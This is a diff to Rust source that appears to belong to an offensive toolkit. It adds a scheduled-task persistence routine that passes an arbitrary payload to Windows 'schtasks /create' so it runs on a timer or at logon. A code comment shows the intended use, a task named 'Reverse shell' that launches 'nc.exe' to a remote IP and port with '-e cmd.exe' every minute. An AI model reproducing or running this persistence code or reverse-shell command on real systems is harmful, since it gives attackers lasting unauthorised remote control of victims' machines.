@@ -42,12 +42,53 @@ impl Registry {
 
 
 
+/*
+    Tash Shuduler
+ */
+pub enum Scheduletype {MINUTE, HOURLY,DAILY,WEEKLY,MONTHLY,ONCE,ONSTART,ONLOGON,ONIDLE}
 
+impl std::fmt::Display for Scheduletype {
+    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
+        match self {
+            Scheduletype::MINUTE => write!(f, "MINUTE"),
+            Scheduletype::HOURLY => write!(f, "HOURLY"),
+            Scheduletype::DAILY => write!(f, "DAILY"),
+            Scheduletype::WEEKLY => write!(f, "WEEKLY"),
+            Scheduletype::MONTHLY => write!(f, "MONTHLY"),
+            Scheduletype::ONCE => write!(f, "ONCE"),
+            Scheduletype::ONSTART => write!(f, "ONSTART"),
+            Scheduletype::ONLOGON => write!(f, "ONLOGON"),
+            Scheduletype::ONIDLE => write!(f, "ONIDLE"),
+        }
+    }
+}
 
-pub enum ScheduledTasks {Cmd, Powershell}
-
-impl ScheduledTasks {
-    
+pub struct ScheduledTasks {
+    payload: String,
+    timer: Scheduletype,
+    every: i8,
+    description: String,
 }
 
 
+impl ScheduledTasks {
+    pub fn new(payload: String, timer: Scheduletype, every:i8, description: String) -> Self {
+        Self { payload, timer,every, description} 
+    }
+      
+ 
+    /// .
+    pub fn add_schtasks (&self) {
+        let cmd = format!("/create /sc {} /mo {} /tn \"{}\" /tr '{}'",
+                                    self.timer.to_string(),
+                                    self.every.to_string(),
+                                    self.description,
+                                    self.payload);
+        tools::run_exe("schtasks",&cmd,None);
+       // schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'
+    }
+
+    pub fn powershell(&self) {
+        /* to do :) */
+    }
+}
